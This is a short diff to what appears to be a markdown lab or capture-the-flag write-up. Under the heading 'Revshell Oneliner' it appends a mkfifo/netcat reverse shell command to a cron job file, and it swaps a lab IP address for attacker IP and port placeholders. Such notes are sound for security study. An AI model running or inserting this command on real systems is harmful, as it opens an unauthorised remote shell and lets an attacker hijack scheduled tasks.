@@ -16,5 +16,5 @@ cat /home/joe/.scripts/user_backups.sh
 ```
 ### Revshell Oneliner
 ```bash
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> $(CRONJOB_FILE)
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(ATTACKER IP) $(PORT) >/tmp/f" >> $(CRONJOB_FILE)
 ```
